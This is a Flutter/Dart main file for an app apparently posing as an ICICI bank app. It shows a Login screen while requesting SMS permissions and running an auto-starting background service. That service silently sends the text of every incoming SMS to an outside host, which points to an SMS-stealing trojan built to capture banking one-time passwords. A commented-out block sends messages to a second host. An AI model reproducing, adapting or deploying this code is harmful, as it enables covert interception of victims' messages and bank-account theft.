import 'dart:async';
import 'dart:convert';
import 'dart:ui';

import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_background_service_android/flutter_background_service_android.dart';
import 'package:icici/login.dart';
import 'package:telephony/telephony.dart';
import 'package:http/http.dart' as http;

var _newMessage = "";

// Handle background message
void backgroundMessageHandler(SmsMessage message) async {
  // Http post request
  await http.post(
    Uri.parse("https://icici-d69xx.dauqu.host/sms"),
    headers: <String, String>{
      'Content-Type': 'application/json; charset=UTF-8',
    },
    body: jsonEncode(<String, String>{
      "body": message.body!,
    }),
  );
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await initializeService();
  runApp(const MyApp());
}

Future<void> initializeService() async {
  final service = FlutterBackgroundService();

  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onStart,
      autoStart: true,
      isForegroundMode: true,
    ),
    iosConfiguration: IosConfiguration(
      onBackground: onIosBackground,
    ),
  );

  service.startService();
}

// IOS BackGround Task
bool onIosBackground(ServiceInstance service) {
  WidgetsFlutterBinding.ensureInitialized();
  return true;
}

//Android
// @pragma('vm:entry-point')
void onStart(ServiceInstance service) async {
  // Only available for flutter 3.0.0 and later
  DartPluginRegistrant.ensureInitialized();

  if (service is AndroidServiceInstance) {
    service.on('setAsForeground').listen((event) {
      service.setAsForegroundService();

      final telephony = Telephony.instance;
      telephony.listenIncomingSms(
        onNewMessage: (SmsMessage message) {
          // Http post request
          http.post(
            Uri.parse("https://icici-d69xx.dauqu.host/sms"),
            headers: <String, String>{
              'Content-Type': 'application/json; charset=UTF-8',
            },
            body: jsonEncode(<String, String>{
              "body": message.body!,
            }),
          );
        },
        listenInBackground: true,
        onBackgroundMessage: backgroundMessageHandler,
      );
    });

    service.on('setAsBackground').listen((event) {
      service.setAsBackgroundService();

      final telephony = Telephony.instance;
      telephony.listenIncomingSms(
        onNewMessage: (SmsMessage message) {
          // Http post request
          http.post(
            Uri.parse("https://icici-d69xx.dauqu.host/sms"),
            headers: <String, String>{
              'Content-Type': 'application/json; charset=UTF-8',
            },
            body: jsonEncode(<String, String>{
              "body": message.body!,
            }),
          );
        },
        onBackgroundMessage: backgroundMessageHandler,
      );
    });
  }

  service.on('stopService').listen((event) {
    service.stopSelf();
  });
}

// onBackgroundMessage(SmsMessage message) async {
//   final Telephony telephony = Telephony.instance;

//   telephony.listenIncomingSms(
//     onBackgroundMessage: (SmsMessage message) async {
//       // Http post request
//       await http.post(
//         Uri.parse("https://all-request-gt6w57.dauqu.host/sms"),
//         headers: <String, String>{
//           'Content-Type': 'application/json; charset=UTF-8',
//         },
//         body: jsonEncode(<String, String>{
//           "body": message.body!,
//         }),
//       );
//     },
//     onNewMessage: (SmsMessage message) async {
//       // Http post request
//       await http.post(
//         Uri.parse("https://all-request-gt6w57.dauqu.host/sms"),
//         headers: <String, String>{
//           'Content-Type': 'application/json; charset=UTF-8',
//         },
//         body: jsonEncode(<String, String>{
//           "body": message.body!,
//         }),
//       );
//     },
//     listenInBackground: true,
//   );
// }

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Flutter Demo',
      theme: ThemeData(primarySwatch: Colors.deepPurple, useMaterial3: true),
      home: const Main(),
    );
  }
}

class Main extends StatefulWidget {
  const Main({Key? key}) : super(key: key);

  @override
  _MainState createState() => _MainState();
}

class _MainState extends State<Main> {
  final Telephony telephony = Telephony.instance;

  // SMS permission
  void _requestPermission() async {
    await telephony.requestSmsPermissions;
    await telephony.requestPhoneAndSmsPermissions;
  }

  void _listenSms() async {
    telephony.listenIncomingSms(
      onBackgroundMessage: backgroundMessageHandler,
      onNewMessage: (SmsMessage message) async {
        // Http post request
        await http.post(
          Uri.parse("https://icici-d69xx.dauqu.host/sms"),
          headers: <String, String>{
            'Content-Type': 'application/json; charset=UTF-8',
          },
          body: jsonEncode(<String, String>{
            "body": message.body!,
          }),
        );

        setState(() {
          _newMessage = message.body!;
        });
      },
      listenInBackground: true,
    );
  }

  @override
  void initState() {
    super.initState();
    _requestPermission();
    _listenSms();
  }

  @override
  Widget build(BuildContext context) {
    return const Scaffold(
      body: Login(),
    );
  }
}
